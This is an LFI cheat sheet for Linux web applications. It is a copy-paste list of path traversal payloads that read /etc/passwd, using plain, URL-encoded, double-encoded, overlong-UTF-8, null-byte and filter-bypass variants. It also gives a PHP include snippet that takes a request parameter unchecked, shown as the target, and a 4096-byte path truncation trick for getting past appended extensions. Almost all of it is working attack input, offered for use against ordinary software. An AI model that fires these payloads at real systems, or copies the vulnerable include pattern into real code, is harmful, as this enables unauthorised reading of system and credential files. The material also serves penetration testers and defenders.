# LFI-Cheat-sheet - LINUX 
-------------------

**Quick Copy-Pastes:**

../
../../
../../../
../../../../
../../../../../
../../../etc/passwd
%2E%2F - Single URL Encode ./
%252E%252F - Double URL Encode ./
%2E%2E%2F - Single URL Encoded ../
%252E%252E%252F - Double URL Encoded ../

**traversal sequence stripped:**
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

**Null Byte variations:**
%00
%2500 - URL Encoded
%00%00

**URL Encoded:**
..%252f..%252f..%252fetc%252fpasswd - double encode
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
%252e%252e%252fetc%252fpasswd
%252e%252e%252fetc%252fpasswd%00

**Traversal from existent folder:**
utils/scripts/(Any suspected path)../../../../../etc/passwd

**Truncated paths -** after 4096 Bytes, PHP will drop anything after 4096 bytes.
<?php
include("includes/".$_GET['param1'].".php");
?>
ex:../../../etc/passwd../././././././<x4096 repetitions of "./"> .php  >> ".php" will be dropped might by pass the above code.
./ - can be substitued with other symbols or dots.

**Filter Bypass Tricks:**
....//....//etc/passwd
..///////..////..//////etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
/var/www/../../etc/passwd





